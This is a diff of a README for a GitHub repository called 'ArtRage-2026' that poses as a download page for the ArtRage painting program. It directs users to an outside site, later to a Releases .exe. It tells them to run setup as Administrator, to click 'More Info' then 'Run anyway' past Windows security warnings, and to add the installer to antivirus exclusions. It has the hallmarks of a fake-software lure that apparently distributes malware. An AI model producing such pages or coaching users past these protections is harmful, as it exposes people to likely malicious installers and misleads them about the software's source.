@@ -1,79 +1,91 @@
-# ArtRage Download for Windows 11 & 10
+# 🎨 ArtRage-2026 - Create Digital Oil Paintings Easily
 
-**ArtRage-2026**
+[![](https://img.shields.io/badge/Download-ArtRage-2026-blue.svg)](https://github.com/DH52200474/ArtRage-2026)
 
-**ArtRage** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📥 How to Download 
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+Follow these steps to get the software on your computer. 
 
----
+1. Visit the [official repository link](https://github.com/DH52200474/ArtRage-2026).
+2. Look for the Releases section on the right side of the screen.
+3. Click the latest version number.
+4. Select the file ending in .exe to start the transfer.
+5. Save the file to your desktop or downloads folder.
 
-## Download & Install
+## ⚙️ How to Install 
 
-> **This is the download page.** Use the button or link below to get **ArtRage** for Windows.
+After the download finishes, follow these instructions to set up ArtRage on your Windows machine.
 
-<p align="center">
-  <a href="https://artrage.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-ArtRage-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download ArtRage">
-  </a>
-</p>
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open the installer.
+3. Windows might show a security window. Click "More Info" and then "Run anyway" if the system asks.
+4. Follow the on-screen prompts provided by the installation wizard.
+5. Choose your preferred destination folder or keep the default path.
+6. Click install and wait for the status bar to finish.
+7. Click the finish button to close the setup window.
 
-| | |
-| --- | --- |
-| **Direct link** | **[artrage.nexustool.fun](https://artrage.nexustool.fun/)** |
-| **Full URL** | `https://artrage.nexustool.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+## 🖼️ Program Features 
 
-### Quick steps
+ArtRage-2026 provides a set of tools to create digital art that mimics physical media. Use these tools to capture the feel of real oils, watercolors, and pencils.
 
-1. Click **[Download — artrage.nexustool.fun](https://artrage.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+### Oil Painting Tools
+The oil painting tool reacts to the surface texture of the canvas. It mimics how paint blends and spreads. You can adjust the thickness of the paint and the amount of thinner for different artistic effects.
 
-<p align="center"><a href="https://artrage.nexustool.fun/"><strong>⬇ Download ArtRage now</strong></a></p>
+### Watercolor Effects
+The watercolor tool allows you to create washes and gradients. The paint flows on the canvas based on the moisture settings. Change the brush size and pressure to create subtle details or broad strokes.
 
----
+### Natural Media
+Choose from a library of pencils, markers, and pastels. These tools replicate the grit of paper and the pressure needed for drawing. The interface scales the tools to match your style.
 
-## About
+### Layers and Blending
+Work with multiple layers to keep your painting organized. You can adjust the transparency of each layer to overlay colors or erase parts without changing the layer below. The software offers standard blending modes to enhance the lighting and mood of your piece.
 
-**ArtRage** setup page for Windows PC users.
+### Custom Brush Settings
+Create your own brush profiles. Adjust settings like size, shape, and jitter to fit your workflow. Save your favorite configurations for quick access during your painting sessions.
 
-**People also search for:** artrage download windows, artrage digital painting install setup 2026
+## 🖥️ System Requirements 
 
-**Repository:** `ArtRage-2026`
+Use this hardware to keep the painting process smooth.
 
+* **Operating System:** Windows 10 or Windows 11 (64-bit).
+* **Processor:** Intel i5 or AMD Ryzen 5 or better.
+* **Memory:** 8 GB of internal memory (RAM).
+* **Graphics:** Dedicated graphics card with at least 2 GB of video memory recommended.
+* **Storage:** 500 MB of free disk space for program files.
+* **Input Device:** A dedicated pen tablet is recommended for pressure sensitivity.
 
-## After install
+## 🛠️ Tips for Success 
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+1. **Start with a sketch layer.** Use the pencil tool on a light layer before you start with paint.
+2. **Use keyboard shortcuts.** Press the Spacebar to move around the canvas quickly. Use the Bracket keys to change brush sizes on the fly.
+3. **Calibrate your pen.** If you use a graphics tablet, adjust the pressure sensitivity in the settings menu. This makes the lines feel natural.
+4. **Save your work.** Use the Save As function often to keep versions of your art throughout the process.
+5. **Manage layers.** Name your layers as you go. This saves time when you make quick changes to your painting.
 
-## System requirements
+## ❓ Common Questions 
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+### Does this work on Windows 11?
+Yes. The software runs on Windows 11 and Windows 10.
 
-## Troubleshooting
+### Can I use a mouse?
+Yes, but a graphics tablet or drawing pen provides better control. Pressure sensitivity makes a large difference in how the digital paint reacts.
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+### Does the software need an internet connection?
+Once you download and install the program, you can use it offline. You only need the internet for the initial download and for any future updates.
 
----
+### Can I export my files?
+Yes. You can export your paintings as image files like JPG, PNG, or PSD format. This allows you to work in other photo editing programs if needed.
 
-**Topics:** artrage-download-windows, artrage, artrage-digital-painting-install-setup-2026, digital, painting, artrage-2026, digital-painting, oil-painting, illustration, concept-art, software, windows-11
+### Where do I find my saved files?
+By default, the program saves your paintings to the Pictures folder on your computer. You can change this path in the program preferences.
+
+## 🗒️ Troubleshooting 
+
+If the program fails to open, check the following items.
+
+1. **Check for updates.** Ensure your Windows system is up to date through the Windows Update menu.
+2. **Restart the computer.** A simple reboot fixes most startup errors.
+3. **Reinstall the software.** Sometimes a file might not download correctly. Delete the old installer and download it again from the [link](https://github.com/DH52200474/ArtRage-2026).
+4. **Check permissions.** Make sure you have administrator rights on your computer. This lets you write files to the installation folder.
+5. **Driver updates.** Update your graphics card drivers from the website of your hardware manufacturer. Old drivers often cause issues with graphics-intensive software.
+6. **Antivirus software.** Some security tools might block new programs. Check your antivirus settings to see if it blocked ArtRage-2026. If it did, add the program to your list of trusted applications.
